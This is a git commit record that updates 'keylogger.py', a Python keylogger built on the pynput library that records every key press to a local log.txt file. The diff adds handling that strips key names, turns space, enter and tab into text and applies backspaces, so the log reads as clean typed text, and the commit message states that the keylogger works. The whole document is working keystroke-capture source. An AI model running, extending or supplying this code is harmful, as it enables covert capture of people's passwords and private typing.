685d1aa3b6066eeea9dace849217dc977348e5de
OkoyeEmmanuel <okoye.tochukwu.emmanuel@gmail.com>
2025-09-12 01:18:48 +0200

    update keylogger.py
    Keylogger is working, I made the code look like chaotic by the word "key.backspace" and others.

--- keylogger.py
+++ keylogger.py
@@ -2,8 +2,24 @@ from pynput.keyboard import Listener
 
 def writetofile(key):
     keydata = str(key)
+    keydata = keydata.replace("'", "")
+    keydata = keydata.replace("Key.shift", "")
+    keydata = keydata.replace("Key.enter", "\n")
+    keydata = keydata.replace("Key.space", " ")
+
+    if keydata == "Key.backspace":
+        with open("log.txt", "r") as f:
+            d = f.read()
+        d = d[:-1]
+        with open("log.txt", "w") as f:
+            f.write(d)
+        return
+    
+    keydata = keydata.replace("Key.backspace", "")
+    keydata = keydata.replace("Key.tab", "    ")
+        
     with open("log.txt", "a") as f:
-        f.write( keydata  + "\n")
+        f.write( keydata)
 
 
 with Listener(on_press=writetofile) as l:
